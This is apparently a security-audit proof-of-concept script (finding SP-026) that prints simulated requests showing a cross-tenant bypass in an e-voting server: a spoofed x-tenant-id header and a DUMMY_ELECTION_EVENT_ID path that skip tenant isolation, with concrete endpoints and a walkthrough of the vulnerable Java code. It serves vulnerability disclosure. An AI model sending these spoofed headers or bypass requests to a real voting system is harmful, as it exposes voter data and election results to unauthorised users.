#!/usr/bin/env python3
"""
PoC: SP-026 — Multi-Tenant Bypass via x-tenant-id Header Spoofing

The ContextWebFilter.java trusts the x-tenant-id header for tenant
routing without verifying the caller's identity against the tenant.

Source: e-voting/voting-server/.../multitenancy/ContextWebFilter.java:101-112
        Lines 183-197: DUMMY_ELECTION_EVENT bypass skips tenant context entirely

Attack: An authenticated user in Tenant A can access Tenant B's election
data by simply setting x-tenant-id: tenant-b-id in the request header.

Additionally, the DUMMY_ELECTION_EVENT_ID path bypasses all tenant context.
"""
import json
import sys

def demonstrate_attack():
    print("=" * 60)
    print("SP-026: Multi-Tenant Bypass PoC")
    print("=" * 60)
    print()

    # Simulated legitimate request from Tenant A
    legitimate_request = {
        "method": "GET",
        "path": "/vs-ws-rest/api/v1/processor/voting/electionevent/ee-123/vc/abc",
        "headers": {
            "Authorization": "Bearer <tenant-a-token>",
            "x-tenant-id": "tenant-a-uuid"
        },
        "routed_to": "tenant-a-database"
    }

    # Attacker spoofs x-tenant-id to access Tenant B
    spoofed_request = {
        "method": "GET",
        "path": "/vs-ws-rest/api/v1/processor/voting/electionevent/ee-123/vc/abc",
        "headers": {
            "Authorization": "Bearer <tenant-a-token>",  # Same token
            "x-tenant-id": "tenant-b-uuid"               # Different tenant!
        },
        "routed_to": "tenant-b-database"
    }

    # DUMMY_ELECTION_EVENT bypass
    bypass_request = {
        "method": "POST",
        "path": "/vs-ws-rest/api/v1/processor/voting/configurevoterportal/electionevent/DUMMY_ELECTION_EVENT_ID",
        "headers": {
            "Authorization": "Bearer <any-token>"
            # No x-tenant-id needed!
        },
        "routed_to": "NO TENANT CONTEXT — bypasses all checks"
    }

    print("[1] Legitimate request (Tenant A user → Tenant A data):")
    print(json.dumps(legitimate_request, indent=2))
    print()
    print("[2] ATTACK: Same token, spoofed tenant header:")
    print(json.dumps(spoofed_request, indent=2))
    print()
    print("    ContextWebFilter.java:101-112 (handleVotingCardManagerApi):")
    print("    → Extracts x-tenant-id from header")
    print("    → Calls tenantLookupService.verifyTenantExists(tenantId)")
    print("    → Only checks tenant EXISTS, not that caller belongs to it")
    print("    → Routes request to Tenant B's database")
    print()
    print("[3] BYPASS: DUMMY_ELECTION_EVENT skips tenant entirely:")
    print(json.dumps(bypass_request, indent=2))
    print()
    print("    ContextWebFilter.java:190-193 (determineCase):")
    print("    '  if (DUMMY_ELECTION_EVENT.equals(electionEventId))")
    print("    '      return Case.OUT_SCOPE;'")
    print("    → chain.filter(exchange) with NO tenant context")
    print()

    print("=" * 60)
    print("Vulnerable code walkthrough:")
    print("=" * 60)
    print("""
ContextWebFilter.java:
  Line 70:  case DUMMY_ELECTION_EVENT, OUT_SCOPE -> chain.filter(exchange)
            // No tenant set — request runs without tenant isolation

  Line 101: private Mono<Void> handleVotingCardManagerApi(...) {
  Line 105:   final String tenantId = exchange.getRequest()
  Line 106:       .getHeaders().getFirst("x-tenant-id");  // Trusts header
  Line 108:   return tenantLookupService.verifyTenantExists(tenantId)
              // Only checks existence, NOT caller authorization
  Line 112:       .then(doFilter(chain, exchange, tenantId));
              // Routes to spoofed tenant

  Line 190:  if (DUMMY_ELECTION_EVENT.equals(electionEventId))
  Line 191:      return Case.OUT_SCOPE;
              // Complete tenant bypass
""")

    print("Impact: Cross-tenant data access in national election system.")
    print("        Voter data, election configs, and results from any")
    print("        canton/election can be accessed by any authenticated user.")

if __name__ == "__main__":
    demonstrate_attack()
